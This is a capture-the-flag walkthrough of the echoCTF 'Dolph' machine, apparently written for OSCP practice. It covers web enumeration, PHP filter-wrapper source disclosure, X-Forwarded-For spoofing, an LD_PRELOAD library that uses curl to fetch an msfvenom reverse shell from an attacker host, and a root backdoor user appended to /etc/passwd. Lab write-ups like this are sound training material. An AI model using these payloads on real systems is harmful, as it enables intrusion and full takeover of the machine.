---
title: "echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD"
date: 2025-07-23
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["nginx", "LD_PRELOAD", "PHP wrapper", "privilege escalation"]
description: "Crack Dolph on echoCTF with nginx enumeration, PHP wrappers, and LD_PRELOAD exploitation. Perfect for OSCP prep!"
---

## Video Walkthrough

{{< youtube k2FNSCH3DDg >}}

[![Watch on YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube)](https://www.youtube.com/watch?v=k2FNSCH3DDg)

# Dolph

# Enumeration

Start by port scanning the target machine.

## NMAP

```bash
sudo nmap -nvv -p- -sC -sV -T4 10.0.50.1
```

## Output

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Tmp uploader
```

It seems that there is an nginx 1.10.3 running on port 80

![Image Description](/images/dolph1.png)

Looking the source code we find a new directory called "/admin".

![Image Description](/images/dolph2.png)

Lets check for more directories

```bash
gobuster dir -u http://10.0.50.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt

/admin                (Status: 301) [Size: 185] [--> http://10.0.50.1/admin/]
/uploads              (Status: 301) [Size: 185] [--> http://10.0.50.1/uploads/]
/.                    (Status: 301) [Size: 185] [--> http://10.0.50.1/./]
```

"/admin" it interesting lets check that as well

```bash
gobuster dir -u http://10.0.50.1/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o admin-rsw.txt

/login                (Status: 200) [Size: 8696]
```

When trying to visit  "/admin/login" we download a a binary. 

 Before examining the binary  we can manually check the functionality of the web uploader. During the testing i was not able to bypass the security mechanism regarding uploading scripts or a file containing a "."

What i found out however is that several PHP wrappers work here so i was able to obtain the source code of the `index.php` and `/admin/index.php`. You can read and follow the following guide to understand how we could abuse PHP wrappers

https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams

I used the following PHP wrapper to obtain the source code of index.php under the admin directory.

```bash
php://filter/convert.base64-encode/resource=/var/www/html/admin/index.php
```

![Image Description](/images/dolph3.png)
Then we can download it by visiting http://10.0.50.1/uploads/wrappersindex and then decoded it to see its contents.

```bash
cat ~/Downloads/wrappersindex  | base64 -d > wrapperindex.php
```

![Image Description](/images/dolph4.png)

Reading the code, it seems that the PHP code retrieves the client’s IP address from HTTP headers, sets it as part of an environment variable, and passes it as an argument to a local `login` binary. It blocks IPs containing a single quote to prevent injection, but still allows IP spoofing via the `X-Forwarded-For` header, which can be abused to influence the environment and execution of the binary.

Also notice that the value of the header that we will be sending then gets processes with in the codes "exec()" function which is crucial! Moving on ..

When we visit "/admin" we get the following:
![Image Description](/images/Pasted image 20250811115147.png)

And when we try to run the "login" binary we g downloaded earlier we get the same thing back but when we specify 127.0.0.1 we are allowed.

![Image Description](/images/dolph5.png)

So by adding the X-Forwarded-For header on our request we should see the flag

![Image Description](/images/dolph6.png)
However even though we tricked the web application to believe that we are coming from 127.0.0.1 and executed the "login" binary which printed the flag how are we going to get access? ...

Well by analyzing the PHP source code we obtained and the login binary we downloaded.

It is noticed that the binary running on the server accepts preloads. This was found by running the command `strace` on the binary.

![Image Description](/images/dolph0.png)


Following the article below we can crate and upload a malicious library on the server using the uploader feature, and then preload it using LD_PRELOAD command in the value of `X-Forwarded-For` and since the value of the header gets processed by exec() we might be able to get execution.

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
# Exploitation

Create a reverse shell using `msfvenom`
```bash
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.11.150 LPORT=80 -f elf -o rev
```

Create a malicious .so file using the guide provided above

```c
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
system("curl http://10.10.11.150/rev -O /tmp/rev");
}
```

Compiling `.c` to `.so`

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Now lets upload our .so file uisng the download service of the server, even though the we cannot append the .so, it still works.

![Image Description](/images/dolph7.png)

![Image Description](/images/dolph8.png)

We have code execution! we managed to upload our reverse shell to the target machine, now we have to make it executable and execute following the same process!

```c
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
system("chmod +/tmp/rev");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![Image Description](/images/Pasted image 20250811124702.png)

We got shell as www-data

# Privilege Escalation

Lets upgrade our shell using python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

Upload and run linpeas.sh reveals tha the '/etc/passwd' is writable!

```bash
wget http://10.10.11.150/linpeas.sh -O /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh

/tmp/linpeas.sh
```

![Image Description](/images/dolph9.png)

So we can create our own password and add a new user as root!

```bash
# On kali
openssl passwd d0tpirate
$1$UaM3ZY23$Xf5rURx8KjC1vT/9pNQmw.

# On Target
echo 'root2:$1$UaM3ZY23$Xf5rURx8KjC1vT/9pNQmw.:0:0:root:/root:/bin/bash' >> /etc/passwd

su root2
(d0tpirate)
```

![Image Description](/images/dolph10.png)

ROOT!